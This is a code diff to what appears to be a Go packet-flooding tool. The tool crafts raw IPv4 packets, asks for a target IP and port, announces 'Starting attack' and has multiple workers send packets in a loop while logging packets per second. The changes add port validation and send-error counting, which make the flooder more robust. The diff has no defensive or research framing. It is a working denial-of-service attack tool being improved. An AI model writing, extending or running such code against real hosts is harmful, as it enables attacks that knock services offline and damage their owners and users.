@@ -26,6 +26,7 @@ var (
 	isIPv6  bool
 	iface   string
 	workers int
+	errors  uint64
 )
 
 func getInterface() string {
@@ -120,6 +121,13 @@ func checksum16(sum uint32) uint16 {
 	return ^uint16(sum)
 }
 
+func validatePort(port int) error {
+	if port < 1 || port > 65535 {
+		return fmt.Errorf("port must be between 1 and 65535: %d", port)
+	}
+	return nil
+}
+
 func craftIPv4(src, dst net.IP, sport, dport int) []byte {
 	buf := make([]byte, 28)
 	ip := buf[:20]
@@ -212,7 +220,9 @@ func sender(id int, wg *sync.WaitGroup, dst net.IP, dport int) {
 	}
 	for atomic.LoadUint32(&stop) == 0 {
 		for _, pkt := range packets {
-			syscall.Sendto(fd, pkt, 0, addr)
+			if err := syscall.Sendto(fd, pkt, 0, addr); err != nil {
+				atomic.AddUint64(&errors, 1)
+			}
 		}
 		atomic.AddUint64(&sent, uint64(len(packets)))
 		if sent%1000000 == 0 {
@@ -228,7 +238,12 @@ func main() {
 	targetIP = strings.TrimSpace(targetIP)
 	fmt.Print("Target Port: ")
 	var targetPort int
-	fmt.Scanf("%d", &targetPort)
+	if _, err := fmt.Scanf("%d", &targetPort); err != nil {
+		log.Fatalf("invalid target port: %v", err)
+	}
+	if err := validatePort(targetPort); err != nil {
+		log.Fatal(err)
+	}
 	fmt.Printf("Starting attack on %s:%d...\n", targetIP, targetPort)
 	parsedTarget, zoneID, err := parseTarget(targetIP)
 	if err != nil {
@@ -257,7 +272,8 @@ func main() {
 			atomic.StoreUint32(&stop, 1)
 		case <-ticker.C:
 			s := atomic.SwapUint64(&sent, 0)
-			log.Printf("pps: %d", s)
+			e := atomic.SwapUint64(&errors, 0)
+			log.Printf("pps: %d errors: %d", s, e)
 		}
 	}
 	wg.Wait()
